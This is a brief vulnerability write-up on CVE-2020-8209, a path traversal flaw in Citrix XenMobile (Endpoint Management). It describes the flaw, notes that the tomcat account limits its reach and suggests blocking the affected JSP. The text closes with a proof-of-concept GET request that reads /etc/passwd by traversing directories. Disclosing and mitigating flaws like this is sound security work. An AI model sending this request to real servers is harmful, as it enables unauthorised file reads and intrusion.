## Overview
CVE-2020-8209 allows attackers to read arbitrary files that XenMobile (aka Citrix Endpoint Management) can access. It is just a classic and simple Path Traversal vulnerability.

However, attackers cannot read all sensitive files on the target server because XenMobile is running with the privilege of the account **tomcat**.

Sysadmins could also completely block the URL **/jsp/help-sb-download.jsp** because this file is deleted on the security patch.

### Bonus for bug bounty hunters

## Proof of Concept
```
GET /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd HTTP/1.1
